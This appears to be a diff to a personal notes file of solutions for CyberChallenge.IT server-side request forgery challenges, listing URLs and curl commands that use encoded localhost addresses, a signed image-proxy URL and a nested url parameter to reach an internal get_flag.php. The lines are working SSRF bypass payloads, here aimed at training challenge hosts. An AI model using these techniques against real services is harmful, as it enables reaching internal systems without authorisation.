@@ -13,3 +13,10 @@ http://ssrf2.challs.cyberchallenge.it/?url=http://0.0.0.0/get_flag.php
 http://ssrf3.challs.cyberchallenge.it/?url=http://%00%2E%00%2E%00%2E%00/get_flag.php
 
 http://ssrf3.challs.cyberchallenge.it/?url=http://%01%02%07%2E%00%2E%00%2E%02/get_flag.php
+
+CAMO
+curl GET -v "http://302camo.challs.cyberchallenge.it/camo.php?url=http%3A%2F%2F0.0.0.0%2Fget_flag.php&hmac=337284bb37c87d9d3e7c47211dc02f26"
+
+curl GET -v "http://302camo.challs.cyberchallenge.it/camo.php?url=/path/to/some/image?url=http%3A%2F%2F0.0.0.0%2Fget_flag.php&hmac=337284bb37c87d9d3e7c47211dc02f26"
+
+[img]https://img.freepik.com/free-photo/freshly-italian-pizza-with-mozzarella-cheese-slice-generative-ai_188544-12347.jpg?url=http://0.0.0.0/get_flag.php[/img]
